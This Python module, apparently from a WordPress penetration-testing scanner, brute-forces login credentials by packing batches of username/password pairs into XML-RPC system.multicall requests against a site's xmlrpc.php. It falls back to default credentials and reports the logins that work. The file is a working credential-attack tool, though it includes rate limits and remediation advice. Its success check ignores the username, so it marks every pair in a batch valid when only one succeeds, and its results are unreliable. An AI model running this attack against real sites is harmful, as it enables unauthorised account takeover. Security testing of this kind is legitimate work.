# recon_wp/steps/xmlrpc/xmlrpc_multicall_step.py
"""
XML-RPC multicall - tests multiple credentials in one request.

Fast batch credential testing via system.multicall.
Falls back to limited default credentials if no wordlist configured.
"""

# WHAT: Fast brute force via XML-RPC system.multicall
# HOW: Sends batch of credentials in single multicall request
# WHY: Multicall allows testing many credentials in one request (faster)
# SECURITY: Rate limited (5/sec), skips after 3 lockouts
# FALLBACK: Uses 20 common WordPress credentials if no wordlist configured

from typing import Optional

from base.dependencies import WordlistDependencyMixin
from base.http_step import BaseHttpStep
from core.finding import Finding
from utils.rate_limiter import RetryLimiter


class XmlrpcMulticallStep(BaseHttpStep, WordlistDependencyMixin):
    """Fast credential brute force via XML-RPC system.multicall.

    SECURITY:
    - Rate limited to 5 requests/second
    - Exponential backoff on failures
    - Skips after 3 consecutive failures
    - Falls back to limited default credentials if no wordlist configured

    DEPENDENCY:
    - Optional wordlist with format: username:password per line
    - Falls back to 20 common WordPress credentials if not configured
    """

    name = "xmlrpc_multicall"
    description = "Fast brute force via XML-RPC multicall"
    severity = "high"
    MODULE = "xmlrpc"

    BATCH_SIZE = 10

    def __init__(self, target, config, http=None):
        super().__init__(target, config, http)
        self._limiter = RetryLimiter(
            max_requests=5,
            per_seconds=1.0,
            backoff_factor=2.0,
            max_retries=3,
            max_consecutive_failures=3,
        )

    async def run(self) -> list[Finding]:
        self.logger.info("Checking XML-RPC multicall brute force availability...")

        credentials = self.resolve_credentials_with_fallback(config_key="wordlist")
        if not credentials:
            return self.findings

        using_fallback = credentials == self.DEFAULT_WORDLIST_CREDENTIALS
        mode = "fallback (limited)" if using_fallback else "wordlist"
        self.logger.info(
            f"Testing {len(credentials)} credentials in multicall batches "
            f"({mode}, rate limited to 5 req/sec, max 3 consecutive failures)"
        )

        url = self.urljoin("xmlrpc.php")
        successful_logins = []
        batches_tested = 0

        for i in range(0, len(credentials), self.BATCH_SIZE):
            if self._limiter.should_skip():
                self.logger.warning(
                    f"Skipping after {self._limiter.consecutive_failures} consecutive failures"
                )
                break

            batch = credentials[i : i + self.BATCH_SIZE]

            result = await self._limiter.execute_with_retry(
                self._test_batch(url, batch),
                on_success=lambda r: successful_logins.extend(r) if r else None,
            )

            batches_tested += 1
            if batches_tested % 5 == 0:
                self.logger.debug(f"Tested {batches_tested} batches...")

        if successful_logins:
            self._add_finding(
                module=self.MODULE,
                severity=self.severity,
                title="Valid credentials found via XML-RPC multicall",
                description=f"Found {len(successful_logins)} valid credential(s) via XML-RPC multicall. "
                f"Tested {batches_tested} batches.",
                evidence=", ".join(f"{u}:{p}" for u, p in successful_logins[:5]),
                recommendation="Disable XML-RPC if not needed, implement account lockout policies, "
                "use strong unique passwords",
                raw={
                    "valid_credentials": successful_logins,
                    "batches_tested": batches_tested,
                    "mode": mode,
                },
            )
            self.logger.warning(
                f"Found {len(successful_logins)} valid credentials via multicall!"
            )
        elif (
            self._limiter.consecutive_failures >= self._limiter.max_consecutive_failures
        ):
            self.logger.warning(
                f"Stopped after {self._limiter.consecutive_failures} consecutive failures - "
                "possible account lockout protection detected"
            )
            self._add_finding(
                module=self.MODULE,
                severity="low",
                title="Possible lockout protection detected",
                description="Multiple consecutive failures during brute force - possible account lockout",
                evidence=f"{self._limiter.consecutive_failures} consecutive failures",
                recommendation="Consider slowing down or stopping to avoid lockouts",
                raw={"consecutive_failures": self._limiter.consecutive_failures},
            )

        return self.findings

    def _build_multicall_request(self, credentials: list[tuple[str, str]]) -> str:
        """Build a multicall XML-RPC request for multiple credentials."""
        calls = ""
        for username, password in credentials:
            calls += f"""
        <param>
            <value><struct>
                <member>
                    <name>methodName</name>
                    <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                    <name>params</name>
                    <value><array>
                        <data>
                            <value><string>{username}</string></value>
                            <value><string>{password}</string></value>
                        </data>
                    </array></value>
                </member>
            </struct></value>
        </param>"""

        return f"""<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
{calls}
</params>
</methodCall>"""

    async def _test_batch(
        self, url: str, credentials: list[tuple[str, str]]
    ) -> Optional[list[tuple[str, str]]]:
        """Test a batch of credentials via multicall."""
        xml_request = self._build_multicall_request(credentials)

        try:
            response = await self.http.post(
                url, content=xml_request, headers={"Content-Type": "text/xml"}
            )

            content = response.text
            valid = []

            if response.status_code == 200 and "<array>" in content:
                for username, password in credentials:
                    if self._check_success(content, username):
                        valid.append((username, password))

            return valid if valid else None

        except Exception as e:
            self.logger.debug(f"Error testing batch: {e}")
            return None

    def _check_success(self, content: str, username: str) -> bool:
        """Check if a credential appears successful in the response."""
        return "<isAdmin>" in content and "<blogid>" in content and "<url>" in content
